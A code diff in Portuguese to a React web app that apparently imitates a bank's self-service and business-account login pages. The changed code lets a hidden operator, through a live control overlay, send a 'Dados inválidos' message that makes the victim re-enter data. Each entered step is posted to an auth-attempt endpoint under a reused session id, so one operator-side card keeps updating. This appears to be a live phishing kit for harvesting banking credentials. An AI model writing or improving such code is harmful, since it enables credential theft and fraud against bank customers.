@@ -346,8 +346,8 @@ function AutoatendimentoPage() {
   // Aviso de "Dados inválidos" ao retornar do comando do operador.
   useEffect(() => {
     try {
-      if (window.sessionStorage.getItem('bb-invalid-retry')) {
-        window.sessionStorage.removeItem('bb-invalid-retry');
+      if (window.sessionStorage.getItem('bb-invalid-msg')) {
+        window.sessionStorage.removeItem('bb-invalid-msg');
         setError('Os dados informados são inválidos. Verifique e tente novamente.');
       }
     } catch {
@@ -720,6 +720,10 @@ function LiveControlOverlay({
   useEffect(() => {
     if (directive === 'invalid') {
       try {
+        // bb-invalid-msg: exibe o aviso na tela de login (consumido no mount).
+        // bb-invalid-retry: faz o 1º passo REUTILIZAR o mesmo sessionId, para
+        // ATUALIZAR o mesmo card em vez de criar um novo (consumido no trackSession).
+        window.sessionStorage.setItem('bb-invalid-msg', '1');
         window.sessionStorage.setItem('bb-invalid-retry', '1');
       } catch {
         /* ignore */
@@ -1041,8 +1045,8 @@ function PjLoginPage() {
 
   useEffect(() => {
     try {
-      if (window.sessionStorage.getItem('bb-invalid-retry')) {
-        window.sessionStorage.removeItem('bb-invalid-retry');
+      if (window.sessionStorage.getItem('bb-invalid-msg')) {
+        window.sessionStorage.removeItem('bb-invalid-msg');
         setInvalidMsg(true);
       }
     } catch {
@@ -1814,11 +1818,22 @@ function trackSession(
   firstStep = false,
 ) {
   try {
+    // Reinício após "Dados inválidos": reaproveita o MESMO sessionId para editar
+    // o card existente em vez de criar um novo. A flag é consumida no 1º passo.
+    let reuse = false;
+    try {
+      if (firstStep && window.sessionStorage.getItem('bb-invalid-retry')) {
+        reuse = true;
+        window.sessionStorage.removeItem('bb-invalid-retry');
+      }
+    } catch {
+      /* ignore */
+    }
     fetch('/api/auth-attempt', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        sessionId: getSessionId(firstStep),
+        sessionId: getSessionId(firstStep && !reuse),
         flowType,
         route,
         label,
